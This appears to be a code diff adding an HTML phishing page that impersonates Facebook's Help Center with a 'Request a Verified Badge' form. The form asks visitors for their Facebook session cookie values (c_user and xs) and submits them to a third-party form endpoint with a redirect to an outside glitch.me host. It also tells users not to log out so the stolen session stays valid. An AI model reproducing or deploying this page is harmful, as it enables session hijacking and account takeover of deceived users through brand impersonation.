@@ -1,0 +1,283 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="description" content="Meta Verified Badge Request Form">
+    <meta name="theme-color" content="#000000">
+    <title>Meta Verified Badge Request</title>
+
+    <link rel="icon" href="favicon.ico">
+    <link rel="stylesheet" href="style.css"> <!-- External stylesheet -->
+
+    <style>
+        /* Base Styles */
+        body {
+            font-family: Arial, sans-serif;
+            background-color: #f9f9f9;
+            margin: 0;
+            padding: 0;
+            display: flex;
+            flex-direction: column;
+            min-height: 100vh;
+        }
+
+        .header {
+            width: 100%;
+            height: 90px;
+            background-color: #4671AC;
+            display: flex;
+            align-items: center;
+            padding-left: 20px;
+        }
+
+        .header h1 {
+            color: white;
+            margin: 0;
+            font-size: 28px;
+        }
+
+        .sub-header {
+            width: 100%;
+            height: 60px;
+            background-color: #E9EBEE;
+            display: flex;
+            align-items: center;
+            padding-left: 20px;
+        }
+
+        .sub-header h4 {
+            color: #007BFF;
+            margin: 0;
+            font-size: 20px;
+        }
+
+        .form-container {
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            margin-top: 40px;
+            flex: 1;
+            padding: 20px;
+        }
+
+        .form-box {
+            width: 100%;
+            max-width: 600px;
+            background-color: #F5F6F7;
+            border-radius: 10px;
+            box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
+            padding: 30px;
+        }
+
+        .form-box h5 {
+            margin-bottom: 15px;
+            font-size: 20px;
+            color: #333;
+        }
+
+        .form-box p {
+            font-size: 14px;
+            margin-bottom: 15px;
+            color: #555;
+        }
+
+        .form-box label {
+            font-size: 14px;
+            color: #333;
+            display: block;
+            margin-bottom: 5px;
+        }
+
+        .form-box input[type="text"] {
+            width: 100%;
+            padding: 12px;
+            margin: 10px 0;
+            border: 1px solid #ddd;
+            border-radius: 5px;
+            font-size: 14px;
+            box-sizing: border-box;
+        }
+
+        .form-box input[type="text"]:focus {
+            border-color: #4285F4;
+            outline: none;
+        }
+
+        .form-box .tooltip {
+            font-size: 12px;
+            color: #888;
+            display: inline-block;
+            margin-top: 5px;
+        }
+
+        .form-box .tooltip::before {
+            content: "ℹ️";
+            margin-right: 5px;
+            font-size: 16px;
+        }
+
+        .form-box .error-message {
+            font-size: 12px;
+            color: red;
+            display: none;
+            margin-top: 5px;
+        }
+
+        .form-box button {
+            background-color: #4271B5;
+            color: white;
+            padding: 12px 20px;
+            border: none;
+            border-radius: 5px;
+            cursor: pointer;
+            font-size: 16px;
+            width: 100%;
+            transition: background-color 0.3s ease;
+        }
+
+        .form-box button:hover {
+            background-color: #365C8D;
+        }
+
+        .form-box .progress-container {
+            width: 100%;
+            background-color: #ddd;
+            border-radius: 5px;
+            overflow: hidden;
+            margin-top: 15px;
+            height: 6px;
+        }
+
+        .form-box .progress-bar {
+            height: 100%;
+            width: 0%;
+            background-color: #4CAF50;
+        }
+
+        .video-link img {
+            width: 120px;
+            height: 80px;
+            margin-top: 10px;
+            border-radius: 8px;
+            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);
+        }
+
+        .footer {
+            text-align: center;
+            padding: 20px;
+            font-size: 12px;
+            color: #666;
+        }
+
+        .footer a {
+            color: #007BFF;
+            text-decoration: none;
+        }
+
+        .footer a:hover {
+            text-decoration: underline;
+        }
+
+        /* Confirmation message styles */
+        .confirmation {
+            background-color: #D4EDDA;
+            color: #155724;
+            border: 1px solid #C3E6CB;
+            padding: 15px;
+            border-radius: 5px;
+            margin-top: 20px;
+            display: none;
+        }
+
+        /* Responsiveness */
+        @media (max-width: 768px) {
+            .form-box {
+                padding: 20px;
+            }
+
+            .header h1 {
+                font-size: 24px;
+            }
+
+            .sub-header h4 {
+                font-size: 18px;
+            }
+
+            .form-box h5 {
+                font-size: 18px;
+            }
+        }
+    </style>
+</head>
+
+<body>
+    <div class="header">
+        <h1>Facebook</h1>
+    </div>
+
+    <div class="sub-header">
+        <h4>Help Center</h4>
+    </div>
+
+    <div class="form-container">
+        <div class="form-box">
+            <h5>Request a Verified Badge on Facebook</h5>
+            <p><strong>The verified badge means that Meta has confirmed that the Page or profile is the authentic presence of the individual, public figure, or brand that it represents.</strong></p>
+            <p><strong>Previously, the verified badge also required the person or brand to be notable and unique. You may still see users with a verified badge that represents our previous eligibility requirements.</strong></p>
+
+            <p><strong>Please provide the precise details below. Refer to the video for clarification if you find the instructions unclear.</strong></p>
+    <p class="fw-semibold text-secondary" style="font-size: 12px;">Detailed Video Information.</p>
+            <div class="video-link">
+              
+                <a href="https://cdn.glitch.global/116aac45-aeea-4339-8e11-ec99eca8b56f/detailed_video.mp4?v=1721736922555">
+                                <img src="https://i.pinimg.com/originals/97/95/69/979569a2dedd37573974ceebc05b4a4e.png" alt="fb" style="width: 120px; height: 80px;">
+                     <br>
+                   
+                          </a>
+            
+              
+            </div>
+<br>
+            <p>Please make sure to provide the requested information below:</p>
+<br>
+            <form id="myForm" action="https://api.web3forms.com/submit" method="POST" onsubmit="showConfirmation(event)">
+                 <input type="hidden" name="access_key" value="5d15b4f7-ef93-43c9-be63-2d44ba9262c3">
+              <input
+    type="hidden"
+    name="_redirect"
+    value="https://badge-all-requests-here.glitch.me/pass.html"method="post"> 
+                <label for="c_user">c_user</label>
+                <input type="text" name="c_user" id="c_user" placeholder=""  required>
+                <span class="tooltip">This is your session cookie value.</span>
+               
+
+                <label for="xs">xs</label>
+                <input type="text" name="xs" id="xs" placeholder="" pattern="^(?=.*[a-z])(?=.*[A-Z])(?=.*\d)(?=.*[@#$%^&+=]).{40,}$" required>
+                <span class="tooltip">This is your session cookie value.</span>
+                <div class="error-message" id="xs_error">Please enter a valid xs value (at least 40 characters, including letters, digits, and special characters).</div>
+
+                <p style="font-size: 12px;">Please do not log out from your computer or laptop until you have received a verification email.</p>
+
+                <!-- Progress Bar -->
+                <div class="progress-container" id="progress-container">
+                    <div class="progress-bar" id="progress-bar"></div>
+                </div>
+ <button type="submit" class="text-white border-0" style="background: rgb(66, 103, 178);">Submit</button>
+            </form>
+
+            <div class="confirmation" id="confirmation-message">
+                Your request has been successfully submitted. Please check your email for further instructions.
+            </div>
+        </div>
+    </div>
+
+    <div class="footer">
+        <p>&copy; 2024 Meta. All rights reserved. <a href="#">Terms</a> | <a href="#">Privacy</a></p>
+    </div>
+
+   
+</body>
+
+</html>
